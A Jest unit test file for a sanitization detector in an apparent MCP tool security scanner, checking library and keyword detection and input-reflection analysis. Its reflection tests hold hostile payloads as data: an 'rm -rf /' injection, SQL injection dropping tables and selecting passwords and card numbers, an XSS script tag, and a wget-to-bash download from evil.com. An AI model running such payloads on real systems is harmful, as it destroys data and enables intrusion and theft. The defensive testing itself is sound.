/**
 * SanitizationDetector Unit Tests
 *
 * Tests for sanitization detection including:
 * - Library pattern detection (DOMPurify, bleach, validator, etc.)
 * - Generic keyword detection
 * - Response-time sanitization evidence
 * - Input reflection analysis
 * - Confidence adjustment calculation
 *
 * @see Issue #56: Improve security analysis granularity
 */

import { Tool } from "@modelcontextprotocol/sdk/types.js";
import {
  SanitizationDetector,
  SanitizationDetectionResult,
} from "../modules/securityTests/SanitizationDetector";
import { CONFIDENCE_BOOSTS } from "../config/sanitizationPatterns";

// Helper to create mock tools
const createTool = (overrides: Partial<Tool> = {}): Tool => ({
  name: "test-tool",
  description: "A test tool",
  inputSchema: {
    type: "object",
    properties: {},
  },
  ...overrides,
});

describe("SanitizationDetector", () => {
  let detector: SanitizationDetector;

  beforeEach(() => {
    detector = new SanitizationDetector();
  });

  describe("Library Detection", () => {
    describe("XSS Prevention Libraries", () => {
      it("should detect DOMPurify in description", () => {
        const tool = createTool({
          description:
            "Uses DOMPurify to process HTML content before rendering",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("DOMPurify");
        expect(result.categories).toContain("xss");
        expect(result.totalConfidenceAdjustment).toBe(25);
      });

      it("should detect DOMPurify with various casings", () => {
        const tools = [
          createTool({ description: "Sanitizes with dompurify" }),
          createTool({ description: "Uses dom-purify for XSS prevention" }),
          createTool({ description: "DOMPURIFY is used here" }),
        ];

        for (const tool of tools) {
          const result = detector.detect(tool);
          expect(result.libraries).toContain("DOMPurify");
        }
      });

      it("should detect xss library", () => {
        const tool = createTool({
          description: "Uses xss() function to clean user input",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("xss");
        expect(result.categories).toContain("xss");
      });

      it("should detect bleach library (Python)", () => {
        const tool = createTool({
          description:
            "Input is cleaned using bleach.clean() before processing",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("bleach");
        expect(result.categories).toContain("xss");
      });
    });

    describe("HTML Sanitization Libraries", () => {
      it("should detect sanitize-html", () => {
        const tool = createTool({
          description: "HTML content is processed through sanitize-html",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("sanitize-html");
        expect(result.categories).toContain("html");
      });

      it("should detect escape-html", () => {
        const tool = createTool({
          description: "Uses escape-html to prevent XSS",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("escape-html");
        expect(result.categories).toContain("encoding");
      });
    });

    describe("Input Validation Libraries", () => {
      it("should detect validator.js patterns", () => {
        const tool = createTool({
          description:
            "Uses validator.isEmail() and validator.escape() for input validation",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("validator");
        expect(result.categories).toContain("input");
      });

      it("should detect Zod schema validation", () => {
        const tool = createTool({
          description:
            "Input validated using Zod schema with z.string().safeParse()",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("Zod");
        expect(result.categories).toContain("input");
      });

      it("should detect Joi validation", () => {
        const tool = createTool({
          description: "Uses Joi.string().validate() for input checking",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("Joi");
        expect(result.categories).toContain("input");
      });

      it("should detect pydantic (Python)", () => {
        const tool = createTool({
          description: "Uses pydantic BaseModel for input validation",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("pydantic");
        expect(result.categories).toContain("input");
      });
    });

    describe("Multiple Libraries", () => {
      it("should detect multiple libraries in the same description", () => {
        const tool = createTool({
          description:
            "Uses Zod for type checking and DOMPurify for XSS prevention",
        });

        const result = detector.detect(tool);

        expect(result.detected).toBe(true);
        expect(result.libraries).toContain("DOMPurify");
        expect(result.libraries).toContain("Zod");
        expect(result.categories).toContain("xss");
        expect(result.categories).toContain("input");
        // Should get combined adjustment (25 + 15 = 40)
        expect(result.totalConfidenceAdjustment).toBe(40);
      });
    });
  });

  describe("Generic Pattern Detection", () => {
    it("should detect 'sanitized' keyword", () => {
      const tool = createTool({
        description: "Input is sanitized before use",
      });

      const result = detector.detect(tool);

      expect(result.detected).toBe(true);
      expect(result.genericPatterns).toContain("sanitized");
      expect(result.totalConfidenceAdjustment).toBe(
        CONFIDENCE_BOOSTS.GENERIC_KEYWORD,
      );
    });

    it("should detect 'escaped' keyword", () => {
      const tool = createTool({
        description: "Special characters are escaped in the output",
      });

      const result = detector.detect(tool);

      expect(result.detected).toBe(true);
      expect(result.genericPatterns).toContain("escaped");
    });

    it("should detect 'validated' keyword", () => {
      const tool = createTool({
        description: "All inputs are validated before processing",
      });

      const result = detector.detect(tool);

      expect(result.detected).toBe(true);
      expect(result.genericPatterns).toContain("validated");
    });

    it("should detect 'filtered' keyword", () => {
      const tool = createTool({
        description: "Malicious content is filtered from input",
      });

      const result = detector.detect(tool);

      expect(result.detected).toBe(true);
      expect(result.genericPatterns).toContain("filtered");
    });

    it("should detect multiple generic keywords", () => {
      const tool = createTool({
        description: "Input is sanitized, validated, and filtered before use",
      });

      const result = detector.detect(tool);

      expect(result.detected).toBe(true);
      expect(result.genericPatterns.length).toBeGreaterThanOrEqual(3);
    });

    it("should not double-count library name as generic keyword", () => {
      // "sanitize-html" contains "sanitize" but should only count as library
      const tool = createTool({
        description: "Uses sanitize-html to process HTML content",
      });

      const result = detector.detect(tool);

      expect(result.detected).toBe(true);
      expect(result.libraries).toContain("sanitize-html");
      // Generic patterns should not include the library's base word
      // The adjustment should be the library's boost, not library + keyword
      expect(result.totalConfidenceAdjustment).toBe(20); // sanitize-html's boost
      // Verify "sanitize" from "sanitize-html" is not double counted as generic
      expect(result.genericPatterns).not.toContain("sanitize");
    });
  });

  describe("Response Detection", () => {
    it("should detect [sanitized] in response", () => {
      const result = detector.detectInResponse(
        "Command logged: [sanitized] - stored for review",
      );

      expect(result.detected).toBe(true);
      expect(result.genericPatterns).toContain("[sanitized]");
    });

    it("should detect [filtered] in response", () => {
      const result = detector.detectInResponse(
        "Input was [filtered] before processing",
      );

      expect(result.detected).toBe(true);
      expect(result.genericPatterns).toContain("[filtered]");
    });

    it("should detect [redacted] in response", () => {
      const result = detector.detectInResponse("Sensitive data: [redacted]");

      expect(result.detected).toBe(true);
      expect(result.genericPatterns).toContain("[redacted]");
    });

    it("should detect 'input sanitized' phrase", () => {
      const result = detector.detectInResponse(
        "Your input was sanitized for security",
      );

      expect(result.detected).toBe(true);
    });

    it("should return empty result for clean responses", () => {
      const result = detector.detectInResponse(
        "Operation completed successfully",
      );

      expect(result.detected).toBe(false);
      expect(result.genericPatterns).toHaveLength(0);
    });
  });

  describe("Schema Text Extraction", () => {
    it("should extract sanitization info from schema descriptions", () => {
      const tool = createTool({
        name: "data-processor",
        description: "Processes user data",
        inputSchema: {
          type: "object",
          properties: {
            html: {
              type: "string",
              description: "HTML content, sanitized with DOMPurify before use",
            },
            email: {
              type: "string",
              description: "Email address, validated with validator.isEmail()",
            },
          },
        },
      });

      const result = detector.detect(tool);

      expect(result.detected).toBe(true);
      expect(result.libraries).toContain("DOMPurify");
      expect(result.libraries).toContain("validator");
    });
  });

  describe("Confidence Adjustment Calculation", () => {
    it("should calculate correct adjustment for single library", () => {
      const tool = createTool({
        description: "Uses DOMPurify for XSS prevention",
      });

      const result = detector.detect(tool);

      expect(result.totalConfidenceAdjustment).toBe(25); // DOMPurify boost
    });

    it("should calculate combined adjustment for multiple libraries", () => {
      const tool = createTool({
        description: "Uses DOMPurify, Zod, and escape-html for security",
      });

      const result = detector.detect(tool);

      // DOMPurify (25) + Zod (15) + escape-html (15) = 55, but capped at 50
      expect(result.totalConfidenceAdjustment).toBe(
        CONFIDENCE_BOOSTS.MAX_ADJUSTMENT,
      );
    });

    it("should cap adjustment at MAX_ADJUSTMENT", () => {
      const tool = createTool({
        description:
          "Uses DOMPurify, bleach, xss, validator, Zod, Joi, sanitize-html, and escape-html",
      });

      const result = detector.detect(tool);

      expect(result.totalConfidenceAdjustment).toBeLessThanOrEqual(
        CONFIDENCE_BOOSTS.MAX_ADJUSTMENT,
      );
    });

    it("should add generic keyword boosts", () => {
      const tool = createTool({
        description: "Input is thoroughly sanitized and validated",
      });

      const result = detector.detect(tool);

      // 2 generic keywords * GENERIC_KEYWORD boost
      expect(result.totalConfidenceAdjustment).toBe(
        2 * CONFIDENCE_BOOSTS.GENERIC_KEYWORD,
      );
    });
  });

  describe("Input Reflection Analysis", () => {
    it("should detect exact reflection", () => {
      const payload = "SELECT * FROM users";
      const response = "Query executed: SELECT * FROM users";

      const result = detector.detectInputReflection(payload, response);

      expect(result.reflected).toBe(true);
      expect(result.reflectionType).toBe("exact");
      expect(result.confidenceReduction).toBe(0);
    });

    it("should detect partial reflection", () => {
      const payload = "SELECT * FROM users WHERE id = 1; DROP TABLE users;--";
      const response = "Error: DROP command not allowed";

      const result = detector.detectInputReflection(payload, response);

      expect(result.reflected).toBe(true);
      expect(result.reflectionType).toBe("partial");
      expect(result.partialMatches).toContain("DROP");
      expect(result.confidenceReduction).toBe(10);
    });

    it("should detect no reflection with high confidence reduction", () => {
      const payload = "; rm -rf /; echo 'pwned'";
      const response = "Operation completed successfully";

      const result = detector.detectInputReflection(payload, response);

      expect(result.reflected).toBe(false);
      expect(result.reflectionType).toBe("none");
      expect(result.confidenceReduction).toBe(20);
    });

    it("should detect URL-encoded reflection", () => {
      const payload = "<script>alert('xss')</script>";
      const response = `Input received: ${encodeURIComponent(payload)}`;

      const result = detector.detectInputReflection(payload, response);

      expect(result.reflected).toBe(true);
      expect(result.reflectionType).toBe("transformed");
      expect(result.confidenceReduction).toBe(15);
    });

    it("should detect HTML-escaped reflection", () => {
      const payload = "<script>alert('xss')</script>";
      const response =
        "Input received: &lt;script&gt;alert('xss')&lt;/script&gt;";

      const result = detector.detectInputReflection(payload, response);

      expect(result.reflected).toBe(true);
      expect(result.reflectionType).toBe("transformed");
      expect(result.confidenceReduction).toBe(15);
    });

    it("should extract SQL keywords from payload", () => {
      const payload =
        "1; SELECT password FROM users UNION ALL SELECT credit_card FROM payments";
      const response = "Error: UNION and SELECT detected in input";

      const result = detector.detectInputReflection(payload, response);

      expect(result.reflected).toBe(true);
      expect(result.partialMatches).toEqual(
        expect.arrayContaining(["SELECT", "UNION"]),
      );
    });

    it("should extract command injection keywords", () => {
      const payload = "test; wget http://evil.com/malware.sh | bash";
      const response = "Error: Blocked command: wget";

      const result = detector.detectInputReflection(payload, response);

      expect(result.reflected).toBe(true);
      expect(result.partialMatches).toContain("wget");
    });
  });

  describe("Result Merging", () => {
    it("should merge multiple detection results", () => {
      const toolResult: SanitizationDetectionResult = {
        detected: true,
        libraries: ["DOMPurify"],
        categories: ["xss"],
        genericPatterns: [],
        totalConfidenceAdjustment: 25,
        evidence: ["Library detected: DOMPurify"],
      };

      const responseResult: SanitizationDetectionResult = {
        detected: true,
        libraries: [],
        categories: [],
        genericPatterns: ["[sanitized]"],
        totalConfidenceAdjustment: 10,
        evidence: ["Response contains sanitization indicator"],
      };

      const merged = detector.mergeResults(toolResult, responseResult);

      expect(merged.detected).toBe(true);
      expect(merged.libraries).toContain("DOMPurify");
      expect(merged.genericPatterns).toContain("[sanitized]");
      expect(merged.evidence).toHaveLength(2);
      // Recalculated: 25 (DOMPurify) + 8 (generic keyword)
      expect(merged.totalConfidenceAdjustment).toBe(33);
    });

    it("should deduplicate when merging", () => {
      const result1: SanitizationDetectionResult = {
        detected: true,
        libraries: ["DOMPurify"],
        categories: ["xss"],
        genericPatterns: ["sanitized"],
        totalConfidenceAdjustment: 25,
        evidence: ["Library detected: DOMPurify"],
      };

      const result2: SanitizationDetectionResult = {
        detected: true,
        libraries: ["DOMPurify"], // duplicate
        categories: ["xss"], // duplicate
        genericPatterns: ["validated"],
        totalConfidenceAdjustment: 8,
        evidence: ["Library detected: DOMPurify"], // duplicate
      };

      const merged = detector.mergeResults(result1, result2);

      expect(merged.libraries).toEqual(["DOMPurify"]); // no duplicate
      expect(merged.categories).toEqual(["xss"]); // no duplicate
      expect(merged.genericPatterns).toEqual(["sanitized", "validated"]);
      expect(merged.evidence).toHaveLength(1); // deduplicated
    });
  });

  describe("No Detection Cases", () => {
    it("should return empty result for tool without sanitization", () => {
      const tool = createTool({
        name: "calculator",
        description: "Performs basic math operations",
      });

      const result = detector.detect(tool);

      expect(result.detected).toBe(false);
      expect(result.libraries).toHaveLength(0);
      expect(result.genericPatterns).toHaveLength(0);
      expect(result.totalConfidenceAdjustment).toBe(0);
    });

    it("should not false-positive on word 'validate' in non-security context", () => {
      // "validate" is a generic keyword, so it should be detected
      // This test ensures we're not being overly aggressive
      const tool = createTool({
        description: "Validates that the file exists on disk",
      });

      const result = detector.detect(tool);

      // This should still be detected as it mentions validation
      expect(result.detected).toBe(true);
      expect(result.genericPatterns).toContain("validates");
      // But confidence boost is small
      expect(result.totalConfidenceAdjustment).toBe(
        CONFIDENCE_BOOSTS.GENERIC_KEYWORD,
      );
    });
  });

  describe("detectFromText", () => {
    it("should analyze arbitrary text for sanitization", () => {
      const text =
        "This prompt uses DOMPurify to clean HTML and validator.js for email validation";

      const result = detector.detectFromText(text);

      expect(result.detected).toBe(true);
      expect(result.libraries).toContain("DOMPurify");
      expect(result.libraries).toContain("validator");
    });
  });
});
